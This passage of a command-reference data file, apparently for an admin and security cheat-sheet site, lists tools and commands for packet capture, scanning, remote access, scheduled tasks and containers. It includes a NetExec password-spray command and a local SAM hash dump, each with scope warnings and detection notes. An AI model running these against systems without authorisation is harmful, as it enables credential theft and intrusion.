only."},{"title":"Password-spray across users","cmd":"nxc smb {{TARGET:10.0.0.5}} -u users.txt -p {{PASS:Spring2024!}} --continue-on-success","note":"Trying one password against many users (rather than many passwords against one) stays under lockout thresholds. --continue-on-success keeps going after the first hit."},{"title":"Enumerate shares and access","cmd":"nxc smb {{TARGET:10.0.0.5}} -u {{USER:admin}} -p {{PASS:Password1}} --shares","optional":true,"note":"Lists every share and your read/write rights on it, which quickly surfaces readable file stores and writable drop points."},{"title":"Dump local hashes as admin","cmd":"nxc smb {{TARGET:10.0.0.5}} -u {{USER:admin}} -p {{PASS:Password1}} --sam","optional":true,"note":"With admin rights, --sam dumps the local account hashes (also --lsa for secrets, -M for modules). High impact — engagement scope only."}],"install":{"mac":"pipx install netexec","linux":"pipx install netexec"}},
 {"id":"tool-wireshark","updated":"2026-07","cat":"Tools","team":"blue","title":"Wireshark","desc":"GUI network protocol analyzer with deep packet dissection; ships tshark CLI and dumpcap capture backend.","url":"https://www.wireshark.org","license":"GPL-2.0","platforms":["windows","macos","linux"],"tags":["network","forensics","tools"],"attack":["T1040"],"danger":"Full packet capture can expose credentials and sensitive data in cleartext traffic; capturing networks without authorization is illegal.","detect":"Interfaces in promiscuous mode and unexpected dumpcap/tshark processes on servers; SPAN/tap access outside change control.","mitigate":"Encrypt traffic (TLS/SSH), restrict promiscuous-capture privileges, and monitor for unauthorized capture processes.","install":{"cmd":"winget install Wireshark.Wireshark","mac":"brew install --cask wireshark","linux":"sudo apt install wireshark"}},
 {"id":"tool-tcpdump","updated":"2026-07","cat":"Tools","team":"blue","title":"tcpdump","desc":"Command-line packet capture and BPF filtering; preinstalled on most macOS/Linux systems.","url":"https://www.tcpdump.org","license":"BSD-3-Clause","platforms":["macos","linux"],"tags":["network","tools"],"attack":["T1040"],"danger":"Captures raw traffic that may contain cleartext credentials; only capture on networks you are authorized to monitor.","detect":"Unexpected tcpdump execution and interfaces entering promiscuous mode (kernel logs, auditd execve records).","mitigate":"Limit CAP_NET_RAW/sudo for capture, encrypt sensitive traffic, and audit packet-capture tool usage.","steps":[{"title":"Capture live traffic","cmd":"sudo tcpdump -i {{IFACE:eth0}} -n","note":"-n skips DNS resolution so packets scroll quickly with raw addresses. The fastest way to confirm what's actually crossing an interface."},{"title":"Filter and save to a pcap","cmd":"sudo tcpdump -i {{IFACE:eth0}} -n 'host {{TARGET:10.0.0.5}} and port 80' -w cap.pcap","note":"A BPF expression narrows the capture to what you care about, and -w writes a pcap you can open later in Wireshark or tshark."},{"title":"Read back a saved capture","cmd":"tcpdump -n -r cap.pcap","note":"-r replays a pcap file; add a filter expression to drill into a subset without re-capturing."},{"title":"Show packet payloads","cmd":"sudo tcpdump -i {{IFACE:eth0}} -A -s0 'port 80'","optional":true,"note":"-A prints the ASCII payload and -s0 captures whole packets (no truncation), useful for reading cleartext protocols by eye."}],"install":{"mac":"brew install tcpdump","linux":"sudo apt install tcpdump"}},
 {"id":"tool-masscan","updated":"2026-07","cat":"Tools","team":"purple","title":"masscan","desc":"Asynchronous mass IP port scanner able to sweep large ranges very fast; nmap-compatible flag style.","url":"https://github.com/robertdavidgraham/masscan","license":"AGPL-3.0","platforms":["windows","macos","linux"],"tags":["network","scanning","tools"],"attack":["T1046"],"danger":"Can scan the entire IPv4 space at high packet rates, risking network saturation and IDS alerts.","detect":"High-rate SYN traffic to many ports/hosts from a single source (IDS port-scan signatures, NetFlow anomalies).","mitigate":"Rate-limit and segment networks, restrict exposed services with firewalls, and alert on horizontal/vertical scan patterns.","steps":[{"title":"Sweep one port across a big range","cmd":"sudo masscan {{RANGE:10.0.0.0/16}} -p{{PORT:443}} --rate {{RATE:1000}}","note":"masscan sends asynchronous SYN packets, so it can cover huge ranges quickly. --rate caps packets per second — keep it modest so you don't overwhelm the network. Root is required for raw sockets."},{"title":"Scan several ports at once","cmd":"sudo masscan {{RANGE:10.0.0.0/16}} -p80,443,8080 --rate {{RATE:1000}}","note":"List ports with commas or ranges (e.g. -p1-1000). masscan finds open ports fast but doesn't identify services — that's the next tool's job."},{"title":"Save results and hand off to Nmap","cmd":"sudo masscan {{RANGE:10.0.0.0/16}} -p1-65535 --rate {{RATE:1000}} -oJ scan.json","note":"-oJ writes JSON (also -oL list, -oX XML). Pull the discovered IP:port pairs and re-scan just those with 'nmap -sV' for accurate service and version detail."},{"title":"Keep out-of-scope hosts out","cmd":"sudo masscan {{RANGE:10.0.0.0/16}} -p443 --rate {{RATE:1000}} --excludefile exclude.txt","optional":true,"note":"A high packet rate can disrupt fragile hosts, so list any addresses you must not touch in exclude.txt — masscan will skip them. Only scan ranges you're authorized to test."}],"install":{"mac":"brew install masscan","linux":"sudo apt install masscan"}},
 {"id":"tool-exiftool","updated":"2026-07","cat":"Tools","team":"blue","title":"ExifTool","desc":"Reads/writes metadata (EXIF/IPTC/XMP) across images, documents, and media; core forensics/OSINT utility (winget id OliverBetz.ExifTool).","url":"https://exiftool.org","license":"Artistic-1.0-or-GPL-1.0-or-later","platforms":["windows","macos","linux"],"tags":["forensics","osint","tools"],"steps":[{"title":"Read all metadata","cmd":"exiftool {{FILE:photo.jpg}}","note":"Dumps EXIF/IPTC/XMP — camera model, timestamps, GPS coordinates, editing software — across images, PDFs, Office docs, and many other formats."},{"title":"Pull GPS coordinates","cmd":"exiftool -gps:all -n {{FILE:photo.jpg}}","note":"-n outputs raw numeric latitude/longitude you can drop straight into a map — often the highlight of a photo's metadata."},{"title":"Strip metadata before sharing","cmd":"exiftool -all= {{FILE:photo.jpg}}","note":"-all= removes every metadata tag (keeping a _original backup), which is the clean way to scrub location and device details out of a file."},{"title":"Export a directory to CSV","cmd":"exiftool -csv -r {{DIR:./images}} > meta.csv","optional":true,"note":"-r recurses and -csv writes a table, so you can review or diff metadata across a whole folder of files at once."}],"install":{"cmd":"winget install OliverBetz.ExifTool","mac":"brew install exiftool","linux":"sudo apt install libimage-exiftool-perl"}},
 {"id":"tool-testdisk","updated":"2026-07","cat":"Tools","team":"blue","title":"TestDisk / PhotoRec","desc":"Recovers lost partitions and carves deleted files (PhotoRec) from damaged media; read-only carving is non-destructive.","url":"https://www.cgsecurity.org/wiki/TestDisk","license":"GPL-2.0-or-later","platforms":["windows","macos","linux"],"tags":["forensics","recovery","tools"],"install":{"mac":"brew install testdisk","linux":"sudo apt install testdisk"}},
 {"id":"tool-sysinternals","updated":"2026-07","cat":"Tools","team":"blue","title":"Sysinternals Suite","desc":"Microsoft Windows troubleshooting/IR toolset (Process Explorer, Autoruns, Procmon, Sysmon, PsExec); Windows only.","url":"https://learn.microsoft.com/en-us/sysinternals/","license":"Proprietary (Microsoft freeware EULA)","platforms":["windows"],"tags":["windows","forensics","tools"],"install":{"cmd":"winget install Microsoft.Sysinternals"}},
 {"id":"tool-osquery","updated":"2026-07","cat":"Tools","team":"blue","title":"osquery","desc":"Exposes the OS as a SQL-queryable database for endpoint visibility and detection; not in default apt, add the official osquery repo.","url":"https://www.osquery.io","license":"Apache-2.0","platforms":["windows","macos","linux"],"tags":["osquery","detection","tools"],"install":{"cmd":"winget install osquery.osquery","mac":"brew install --cask osquery","linux":"curl -fsSL https://pkg.osquery.io/deb/pubkey.gpg | sudo tee /etc/apt/trusted.gpg.d/osquery.asc >/dev/null && echo 'deb [arch=amd64] https://pkg.osquery.io/deb deb main' | sudo tee /etc/apt/sources.list.d/osquery.list && sudo apt update && sudo apt install osquery"}},
 {"id":"tool-yara","updated":"2026-07","cat":"Tools","team":"blue","title":"YARA","desc":"Pattern-matching engine for classifying files/memory with rules; the standard for malware identification.","url":"https://virustotal.github.io/yara/","license":"BSD-3-Clause","platforms":["windows","macos","linux"],"tags":["yara","detection","tools"],"install":{"mac":"brew install yara","linux":"sudo apt install yara"}},
 {"id":"tool-clamav","updated":"2026-07","cat":"Tools","team":"blue","title":"ClamAV","desc":"Open-source antivirus engine for detecting trojans, viruses, and other malware; ships the clamscan command-line scanner and freshclam signature updater.","url":"https://www.clamav.net/","license":"GPL-2.0","platforms":["windows","macos","linux"],"tags":["detection","forensics","tools"],"install":{"cmd":"winget install Cisco.ClamAV","mac":"brew install clamav","linux":"sudo apt install clamav"}},
 {"id":"tool-bitdefender-revil-decryptor","updated":"2026-07","cat":"Tools","team":"blue","title":"Bitdefender REvil/Sodinokibi Decryptor","desc":"Free Windows utility that recovers files encrypted by REvil / Sodinokibi ransomware; scans the system or a chosen folder, with an option to back up files before decrypting.","url":"https://www.bitdefender.com/consumer/support/answer/2674/","license":"Proprietary (Bitdefender freeware)","platforms":["windows"],"tags":["recovery","forensics","tools"],"install":{"cmd":"curl -L -o BDREvilDecryptor.exe https://download.bitdefender.com/am/malware_removal/BDREvilDecryptor.exe"}},
 {"id":"tool-malwarebytes","updated":"2026-07","cat":"Tools","team":"blue","title":"Malwarebytes","desc":"Anti-malware scanner that detects and removes trojans, spyware, adware, and ransomware; the free tier provides on-demand scanning and remediation.","url":"https://www.malwarebytes.com/","license":"Proprietary (freemium)","platforms":["windows","macos"],"tags":["detection","tools"],"install":{"cmd":"winget install Malwarebytes.Malwarebytes","mac":"brew install --cask malwarebytes"}},
 {"id":"tool-cpuz","updated":"2026-07","cat":"Tools","title":"CPU-Z","desc":"Windows utility that reports detailed hardware information: CPU name/stepping, core voltage, cache, mainboard/chipset, and memory (SPD) specs.","url":"https://www.cpuid.com/softwares/cpu-z.html","license":"Proprietary (freeware)","platforms":["windows"],"tags":["windows","reference","tools"],"install":{"cmd":"winget install CPUID.CPU-Z"}},
 {"id":"tool-cron-generator","cat":"Tools","title":"Crontab Generator","desc":"Build a cron schedule interactively: pick a preset or set each field, and get the cron expression, a plain-English summary, and a ready-to-paste crontab install line.","widget":"cron","tags":["scheduling","automation","tools"]},
 {"id":"tool-remoteutilities-viewer","updated":"2026-07","cat":"Tools","title":"Remote Utilities - Viewer","desc":"Operator-side console of Remote Utilities; install on your local machine to connect to and control remote PCs running the Host or Agent module.","url":"https://www.remoteutilities.com/download/","license":"Proprietary (free for personal + up to 10 remote PCs)","platforms":["windows"],"tags":["remote","tools"],"attack":["T1219"],"install":{"cmd":"winget install RemoteUtilities.Viewer"}},
 {"id":"tool-remoteutilities-host","updated":"2026-07","cat":"Tools","title":"Remote Utilities - Host","desc":"Remote-side module installed on the target PC for unattended (always-on) access; runs as a Windows service and waits for Viewer connections.","danger":"Grants persistent remote control of the machine it runs on; install only on systems you are authorized to administer.","url":"https://www.remoteutilities.com/download/","license":"Proprietary (free for personal + up to 10 remote PCs)","platforms":["windows"],"tags":["remote","tools"],"attack":["T1219"],"install":{"cmd":"curl -L -o RU-Host.exe https://www.remoteutilities.com/download/host-7.8.4.0.exe"}},
 {"id":"tool-remoteutilities-agent","updated":"2026-07","cat":"Tools","title":"Remote Utilities - Agent","desc":"Lightweight run-on-demand executable for spontaneous, attended support; no installation - the remote user launches it and shares the displayed ID with the operator.","danger":"Provides live remote control while running; only have users launch it for sessions you are authorized to perform.","url":"https://www.remoteutilities.com/download/","license":"Proprietary (free for personal + up to 10 remote PCs)","platforms":["windows"],"tags":["remote","tools"],"attack":["T1219"],"install":{"cmd":"curl -L -o RU-Agent.exe https://www.remoteutilities.com/download/agent-7.8.4.0.exe"}},
 {"id":"tool-remoteutilities-server","updated":"2026-07","cat":"Tools","title":"Remote Utilities - Server","desc":"Optional self-hosted relay/routing server that connects Viewer and Host across networks and NAT without relying on the vendor's public servers.","url":"https://www.remoteutilities.com/download/","license":"Proprietary (free tier available)","platforms":["windows"],"tags":["remote","tools"],"install":{"cmd":"winget install RemoteUtilities.Server"}},
 {"id":"tool-zeek","updated":"2026-07","cat":"Tools","team":"blue","title":"Zeek","desc":"Network security monitor producing rich connection/protocol logs (formerly Bro); no default apt, use the official Zeek repo.","url":"https://zeek.org","license":"BSD-3-Clause","platforms":["macos","linux"],"tags":["zeek","network","tools"],"install":{"mac":"brew install zeek","linux":"echo 'deb http://download.opensuse.org/repositories/security:/zeek/xUbuntu_24.04/ /' | sudo tee /etc/apt/sources.list.d/security:zeek.list && curl -fsSL https://download.opensuse.org/repositories/security:zeek/xUbuntu_24.04/Release.key | gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/security_zeek.gpg >/dev/null && sudo apt update && sudo apt install zeek"}},
 {"id":"tool-suricata","updated":"2026-07","cat":"Tools","team":"blue","title":"Suricata","desc":"High-performance IDS/IPS and network security monitoring engine with rule and EVE JSON output.","url":"https://suricata.io","license":"GPL-2.0","platforms":["windows","macos","linux"],"tags":["suricata","detection","tools"],"install":{"mac":"brew install suricata","linux":"sudo apt install suricata"}},
 {"id":"tool-ghidra","updated":"2026-07","cat":"Tools","team":"blue","title":"Ghidra","desc":"NSA-developed software reverse-engineering suite with a decompiler; requires a JDK (bundled in recent releases).","url":"https://ghidra-sre.org","license":"Apache-2.0","platforms":["windows","macos","linux"],"tags":["forensics","reference","tools"],"install":{"mac":"brew install --cask ghidra"}},
 {"id":"tool-burpsuite","updated":"2026-07","cat":"Tools","team":"purple","title":"Burp Suite Community","desc":"PortSwigger web proxy for intercepting/manipulating HTTP(S); free Community edition (Intruder is rate-limited).","url":"https://portswigger.net/burp/communitydownload","license":"Proprietary (PortSwigger EULA, free)","platforms":["windows","macos","linux"],"tags":["web","tools"],"attack":["T1190"],"danger":"Intercepting proxy that manipulates HTTP(S) to find and exploit web flaws; use only on authorized targets.","detect":"Proxy artifacts (modified headers, the PortSwigger CA), anomalous request tampering, and injection payloads in web logs.","mitigate":"Validate input server-side, deploy a WAF, use TLS with certificate pinning where feasible, and monitor for request tampering.","install":{"cmd":"winget install PortSwigger.BurpSuite.Community","mac":"brew install --cask burp-suite"}},

/* ================= SCHEDULED TASKS & AUTOMATION ================= */
 {"id":"task-list","level":"beginner","cat":"Scheduled Tasks & Automation","title":"List scheduled jobs","desc":"Enumerate scheduled tasks / cron jobs / timers.","tags":["scheduling"],"code":{"ps":"Get-ScheduledTask | Select-Object TaskPath, TaskName, State","cmd":"schtasks /query /fo table","mac":"launchctl list; crontab -l 2>/dev/null","linux":"crontab -l 2>/dev/null; systemctl list-timers --all --no-pager"}},
 {"id":"task-create-cron","level":"beginner","cat":"Scheduled Tasks & Automation","title":"Create a cron job","desc":"Append a recurring cron entry (mac/linux).","danger":"Adds a recurring scheduled job.","tags":["scheduling","automation"],"code":{"linux":"(crontab -l 2>/dev/null; echo \"30 2 * * * {{CMD:/usr/local/bin/backup.sh}}\") | crontab -   # daily 02:30","mac":"(crontab -l 2>/dev/null; echo \"30 2 * * * {{CMD:/usr/local/bin/backup.sh}}\") | crontab -"}},
 {"id":"task-create-win","level":"beginner","cat":"Scheduled Tasks & Automation","title":"Create a scheduled task (Windows)","desc":"Register a daily task.","danger":"Creates a scheduled task; may need admin.","tags":["scheduling","automation","windows"],"code":{"ps":"Register-ScheduledTask -TaskName \"{{NAME:MyTask}}\" -Trigger (New-ScheduledTaskTrigger -Daily -At 2am) -Action (New-ScheduledTaskAction -Execute \"{{CMD:C:/scripts/job.bat}}\")","cmd":"schtasks /create /tn \"{{NAME:MyTask}}\" /tr \"{{CMD:C:\\\\scripts\\\\job.bat}}\" /sc daily /st 02:00"}},
 {"id":"task-systemd-timer","level":"beginner","requires":{"elevation":true},"cat":"Scheduled Tasks & Automation","title":"Enable a systemd timer","desc":"Reload and enable a systemd .timer unit you've created.","danger":"Enables a recurring unit; needs root.","tags":["scheduling","automation","linux"],"code":{"linux":"sudo systemctl daemon-reload\nsudo systemctl enable --now {{NAME:job}}.timer\nsystemctl list-timers {{NAME:job}}.timer"}},
 {"id":"task-launchd","level":"beginner","cat":"Scheduled Tasks & Automation","title":"Load a launchd job (macOS)","desc":"Load a LaunchAgent plist you've placed in ~/Library/LaunchAgents.","danger":"Registers a persistent launchd job.","tags":["scheduling","automation","macos"],"code":{"mac":"launchctl load ~/Library/LaunchAgents/{{LABEL:com.example.job}}.plist\nlaunchctl list | grep {{LABEL:com.example.job}}"}},
 {"id":"task-run-now","level":"beginner","requires":{"elevation":true},"cat":"Scheduled Tasks & Automation","title":"Run a job on demand","desc":"Trigger a scheduled job immediately.","tags":["scheduling"],"code":{"ps":"Start-ScheduledTask -TaskName \"{{NAME:MyTask}}\"","cmd":"schtasks /run /tn \"{{NAME:MyTask}}\"","linux":"sudo systemctl start {{NAME:job}}.service","mac":"launchctl start {{LABEL:com.example.job}}"}},
 {"id":"task-delete","level":"beginner","requires":{"elevation":true},"cat":"Scheduled Tasks & Automation","title":"Delete a scheduled job","desc":"Remove a task / cron entry / timer.","danger":"Permanently removes the scheduled job.","tags":["scheduling"],"code":{"ps":"Unregister-ScheduledTask -TaskName \"{{NAME:MyTask}}\" -Confirm:$false","cmd":"schtasks /delete /tn \"{{NAME:MyTask}}\" /f","linux":"sudo systemctl disable --now {{NAME:job}}.timer   # cron: crontab -e and remove the line","mac":"launchctl unload ~/Library/LaunchAgents/{{LABEL:com.example.job}}.plist"}},
 {"id":"task-disable","level":"beginner","requires":{"elevation":true},"cat":"Scheduled Tasks & Automation","title":"Enable / disable a task","desc":"Toggle a task without deleting it.","danger":"Stops the job from running until re-enabled.","tags":["scheduling"],"code":{"ps":"Disable-ScheduledTask -TaskName \"{{NAME:MyTask}}\"   # Enable-ScheduledTask to restore","cmd":"schtasks /change /tn \"{{NAME:MyTask}}\" /disable","linux":"sudo systemctl disable {{NAME:job}}.timer"}},
 {"id":"task-at","level":"beginner","cat":"Scheduled Tasks & Automation","title":"One-off job at a set time","desc":"Schedule a single future run. Linux/mac need atd running.","tags":["scheduling"],"code":{"cmd":"schtasks /create /tn \"once\" /tr \"{{CMD:C:\\\\job.bat}}\" /sc once /st 14:00","linux":"echo \"{{CMD:/path/job.sh}}\" | at 14:00","mac":"echo \"{{CMD:/path/job.sh}}\" | at 14:00"}},
 {"id":"task-history","level":"beginner","cat":"Scheduled Tasks & Automation","title":"Task run history / last result","desc":"When a job last ran and whether it succeeded.","tags":["scheduling","logs"],"code":{"ps":"Get-ScheduledTaskInfo -TaskName \"{{NAME:MyTask}}\" | Select-Object LastRunTime, LastTaskResult, NextRunTime","linux":"systemctl status {{NAME:job}}.service --no-pager; journalctl -u {{NAME:job}}.service --no-pager | tail"}},
 {"id":"task-boot","level":"beginner","cat":"Scheduled Tasks & Automation","title":"Run at boot / logon","desc":"Start a job at system boot or user logon.","danger":"Creates an autostart entry (also a persistence spot).","tags":["scheduling","persistence"],"code":{"ps":"Register-ScheduledTask -TaskName \"{{NAME:Boot}}\" -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute \"{{CMD:C:/scripts/boot.bat}}\") -RunLevel Highest","linux":"(crontab -l 2>/dev/null; echo \"@reboot {{CMD:/path/job.sh}}\") | crontab -   # or a systemd unit WantedBy=multi-user.target","mac":"# set RunAtLoad=true in the LaunchDaemon/Agent plist, then launchctl load it"}},
 {"id":"task-cron-ref","level":"beginner","cat":"Scheduled Tasks & Automation","title":"Cron syntax reference","desc":"Field layout and shortcuts for crontab schedules.","tags":["scheduling","teaching","reference"],"code":{"linux":"# min  hour  day-of-month  month  day-of-week   command\n#  *  = every    */5 = every 5    1-5 = range    1,15 = list\n# 0 */2 * * *    -> every 2 hours\n# 30 3 * * 1     -> Mondays 03:30\n# @reboot @daily @hourly @weekly\necho 'see: man 5 crontab'"}},
 {"id":"task-periodic-mac","level":"beginner","requires":{"elevation":true},"cat":"Scheduled Tasks & Automation","title":"macOS periodic maintenance","desc":"Built-in daily/weekly/monthly maintenance scripts.","tags":["scheduling","macos"],"code":{"mac":"ls /etc/periodic/daily /etc/periodic/weekly /etc/periodic/monthly\nsudo periodic daily"}},

/* ================= REMOTE MANAGEMENT ================= */
 {"id":"rmt-ssh","level":"beginner","cat":"Remote Management","title":"SSH to a host","desc":"Open a shell on a remote host over SSH (native client on all platforms).","tags":["remote","network"],"code":{"ps":"ssh {{USER:admin}}@{{HOST:10.0.0.5}}","mac":"ssh {{USER:admin}}@{{HOST:10.0.0.5}}","linux":"ssh {{USER:admin}}@{{HOST:10.0.0.5}}"}},
 {"id":"rmt-ssh-key","level":"beginner","cat":"Remote Management","title":"Generate & install an SSH key","desc":"Create an ed25519 keypair and authorize it on a server.","tags":["remote","account"],"code":{"linux":"ssh-keygen -t ed25519 -C \"{{COMMENT:me@host}}\"\nssh-copy-id {{USER:admin}}@{{HOST:10.0.0.5}}","mac":"ssh-keygen -t ed25519 -C \"{{COMMENT:me@host}}\"\nssh-copy-id {{USER:admin}}@{{HOST:10.0.0.5}}","ps":"ssh-keygen -t ed25519\n# append ~/.ssh/id_ed25519.pub to the server's ~/.ssh/authorized_keys"}},
 {"id":"rmt-ssh-config","level":"beginner","cat":"Remote Management","title":"SSH config alias","desc":"Define a host alias in ~/.ssh/config to shorten connections.","tags":["remote","quick-win"],"code":{"ps":"# ~/.ssh/config\nHost {{ALIAS:web}}\n  HostName {{HOST:10.0.0.5}}\n  User {{USER:admin}}\n  IdentityFile ~/.ssh/id_ed25519","mac":"# ~/.ssh/config\nHost {{ALIAS:web}}\n  HostName {{HOST:10.0.0.5}}\n  User {{USER:admin}}\n  IdentityFile ~/.ssh/id_ed25519","linux":"# ~/.ssh/config\nHost {{ALIAS:web}}\n  HostName {{HOST:10.0.0.5}}\n  User {{USER:admin}}\n  IdentityFile ~/.ssh/id_ed25519"}},
 {"id":"rmt-ssh-tunnel","level":"beginner","cat":"Remote Management","title":"SSH local port forward","desc":"Forward a local port to a destination reachable from the remote host.","tags":["remote","network"],"code":{"ps":"ssh -L {{LOCAL:8080}}:{{DEST:127.0.0.1}}:{{RPORT:80}} {{USER:admin}}@{{HOST:10.0.0.5}}","mac":"ssh -L {{LOCAL:8080}}:{{DEST:127.0.0.1}}:{{RPORT:80}} {{USER:admin}}@{{HOST:10.0.0.5}}","linux":"ssh -L {{LOCAL:8080}}:{{DEST:127.0.0.1}}:{{RPORT:80}} {{USER:admin}}@{{HOST:10.0.0.5}}"}},
 {"id":"rmt-ssh-socks","level":"beginner","cat":"Remote Management","title":"SSH dynamic SOCKS proxy","desc":"Tunnel traffic through a host via a local SOCKS proxy.","tags":["remote","network"],"code":{"ps":"ssh -D {{PORT:1080}} {{USER:admin}}@{{HOST:10.0.0.5}}   # point apps at socks5://127.0.0.1:{{PORT:1080}}","mac":"ssh -D {{PORT:1080}} {{USER:admin}}@{{HOST:10.0.0.5}}   # point apps at socks5://127.0.0.1:{{PORT:1080}}","linux":"ssh -D {{PORT:1080}} {{USER:admin}}@{{HOST:10.0.0.5}}   # point apps at socks5://127.0.0.1:{{PORT:1080}}"}},
 {"id":"rmt-ssh-jump","level":"beginner","cat":"Remote Management","title":"SSH through a jump host","desc":"Reach an internal host via a bastion with ProxyJump.","tags":["remote","network"],"code":{"ps":"ssh -J {{JUMP:user@bastion}} {{USER:admin}}@{{HOST:10.0.0.5}}","mac":"ssh -J {{JUMP:user@bastion}} {{USER:admin}}@{{HOST:10.0.0.5}}","linux":"ssh -J {{JUMP:user@bastion}} {{USER:admin}}@{{HOST:10.0.0.5}}"}},
 {"id":"rmt-rdp","level":"beginner","cat":"Remote Management","title":"Remote Desktop (RDP)","desc":"Connect to a Windows host over RDP. Linux needs freerdp.","tags":["remote"],"code":{"ps":"mstsc /v:{{HOST:10.0.0.5}}","cmd":"mstsc /v:{{HOST:10.0.0.5}}","mac":"open \"rdp://{{HOST:10.0.0.5}}\"   # or the Microsoft Remote Desktop app","linux":"xfreerdp /v:{{HOST:10.0.0.5}} /u:{{USER:admin}}"}},
 {"id":"rmt-rdp-enable","level":"beginner","cat":"Remote Management","title":"Enable RDP (Windows)","desc":"Turn on Remote Desktop and open the firewall.","danger":"Exposes RDP to the network; needs admin. Authorized changes only.","tags":["remote","windows"],"code":{"ps":"Set-ItemProperty 'HKLM:\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server' -Name fDenyTSConnections -Value 0\nEnable-NetFirewallRule -DisplayGroup 'Remote Desktop'"}},
 {"id":"rmt-winrm-enable","level":"beginner","cat":"Remote Management","title":"Enable PowerShell Remoting","desc":"Turn on WinRM/PSRemoting on a Windows host.","danger":"Opens WinRM listeners; needs admin.","tags":["remote","windows"],"code":{"ps":"Enable-PSRemoting -Force"}},
 {"id":"rmt-psremote","level":"beginner","cat":"Remote Management","title":"Run commands via PSRemoting","desc":"Execute a script block on remote Windows hosts.","tags":["remote","automation","windows"],"code":{"ps":"Invoke-Command -ComputerName {{HOST:server01}} -ScriptBlock { Get-Service } -Credential (Get-Credential)\n# interactive: Enter-PSSession -ComputerName {{HOST:server01}}"}},
 {"id":"rmt-ansible","level":"beginner","cat":"Remote Management","title":"Ansible ad-hoc command","desc":"Run a module/command across an inventory group. Requires ansible.","tags":["remote","automation"],"code":{"linux":"ansible {{GROUP:webservers}} -i {{INVENTORY:hosts.ini}} -m ping\nansible {{GROUP:webservers}} -i {{INVENTORY:hosts.ini}} -a \"uptime\"","mac":"ansible {{GROUP:webservers}} -i {{INVENTORY:hosts.ini}} -m ping"}},
 {"id":"rmt-screen-tmux","level":"beginner","cat":"Remote Management","title":"Persistent terminal sessions","desc":"Keep a session alive across disconnects with tmux or screen.","tags":["remote","quick-win"],"code":{"linux":"tmux new -s work    # detach Ctrl-b d ; reattach: tmux attach -t work\nscreen -S work      # detach Ctrl-a d ; reattach: screen -r work","mac":"tmux new -s work    # detach Ctrl-b d ; reattach: tmux attach -t work"}},
 {"id":"rmt-sshfs","level":"beginner","cat":"Remote Management","title":"Mount a remote filesystem (SSHFS)","desc":"Mount a remote directory over SSH. Requires sshfs (macFUSE on macOS).","tags":["remote","file-transfer"],"code":{"linux":"sshfs {{USER:admin}}@{{HOST:10.0.0.5}}:{{RPATH:/data}} {{MOUNT:~/mnt}}","mac":"sshfs {{USER:admin}}@{{HOST:10.0.0.5}}:{{RPATH:/data}} {{MOUNT:~/mnt}}"}},
 {"id":"rmt-winrs","level":"beginner","cat":"Remote Management","title":"winrs remote command","desc":"Run a single command on a remote Windows host over WinRM.","tags":["remote","windows"],"code":{"cmd":"winrs -r:{{HOST:server01}} ipconfig /all"}},

/* ================= CONTAINERS ================= */
 {"id":"ctr-ps","level":"intermediate","related":["ctr-exec","ctr-logs","ctr-inspect"],"cat":"Containers","title":"List containers","desc":"Show running and stopped containers. Requires docker or podman.","tags":["containers"],"code":{"ps":"docker ps -a   # podman ps -a","mac":"docker ps -a   # podman ps -a","linux":"docker ps -a   # podman ps -a"}},
 {"id":"ctr-images","level":"intermediate","cat":"Containers","title":"List images","desc":"Local container images and sizes.","tags":["containers"],"code":{"ps":"docker images","mac":"docker images","linux":"docker images"}},
 {"id":"ctr-run","level":"intermediate","related":["ctr-exec","ctr-logs"],"cat":"Containers","title":"Run a container","desc":"Start an interactive throwaway container.","tags":["containers"],"code":{"ps":"docker run --rm -it {{IMAGE:alpine}} sh","mac":"docker run --rm -it {{IMAGE:alpine}} sh","linux":"docker run --rm -it {{IMAGE:alpine}} sh"}},
 {"id":"ctr-exec","level":"intermediate","cat":"Containers","title":"Shell into a running container","desc":"Open a shell inside a running container.","tags":["containers"],"code":{"ps":"docker exec -it {{NAME:web}} sh","mac":"docker exec -it {{NAME:web}} sh","linux":"docker exec -it {{NAME:web}} sh"}},
 {"id":"ctr-logs","level":"intermediate","cat":"Containers","title":"Container logs","desc":"Follow a container's stdout/stderr.","tags":["containers","logs"],"code":{"ps":"docker logs -f --tail 100 {{NAME:web}}","mac":"docker logs -f --tail 100 {{NAME:web}}","linux":"docker logs -f --tail 100 {{NAME:web}}"}},
 {"id":"ctr-inspect","level":"intermediate","cat":"Containers","title":"Inspect a container","desc":"Full config, mounts, and network details as JSON.","tags":["containers"],"code":{"ps":"docker inspect {{NAME:web}}","mac":"docker inspect {{NAME:web}}","linux":"docker inspect {{NAME:web}}"}},
 {"id":"ctr-stats","level":"intermediate","cat":"Containers","title":"Resource usage","desc":"Live CPU/memory/IO per container.","tags":["containers"],"code":{"ps":"docker stats --no-stream","mac":"docker stats --no-stream","linux":"docker stats --no-stream"}},
 {"id":"ctr-stop-rm","level":"intermediate","cat":"Containers","title":"Stop & remove a container","desc":"Stop then delete a container.","danger":"Removes the container (its writable layer is lost).","tags":["containers"],"code":{"ps":"docker stop {{NAME:web}} && docker rm {{NAME:web}}","mac":"docker stop {{NAME:web}} && docker rm {{NAME:web}}","linux":"docker stop {{NAME:web}} && docker rm {{NAME:web}}"}},
 {"id":"ctr-prune","level":"intermediate","cat":"Containers","title":"Reclaim disk space","desc":"Remove stopped containers, dangling images, and unused networks.","danger":"Deletes all stopped containers and unused images/networks.","tags":["containers"],"code":{"ps":"docker system prune -a","mac":"docker system prune -a","linux":"docker system prune -a"}},
 {"id":"ctr-cp","level":"intermediate","cat":"Containers","title":"Copy files in/out","desc":"Copy a file between the host and a container.","tags":["containers","file-transfer"],"code":{"ps":"docker cp {{NAME:web}}:{{RPATH:/etc/nginx/nginx.conf}} ./nginx.conf","mac":"docker cp {{NAME:web}}:{{RPATH:/etc/nginx/nginx.conf}} ./nginx.conf","linux":"docker cp {{NAME:web}}:{{RPATH:/etc/nginx/nginx.conf}} ./nginx.conf"}},
 {"id":"ctr-build","level":"intermediate","related":["ctr-run","ctr-compose"],"cat":"Containers","title":"Build an image","desc":"Build an image from a Dockerfile in the context dir.","tags":["containers"],"code":{"ps":"docker build -t {{TAG:myapp:latest}} {{CONTEXT:.}}","mac":"docker build -t {{TAG:myapp:latest}} {{CONTEXT:.}}","linux":"docker build -t {{TAG:myapp:latest}} {{CONTEXT:.}}"}},
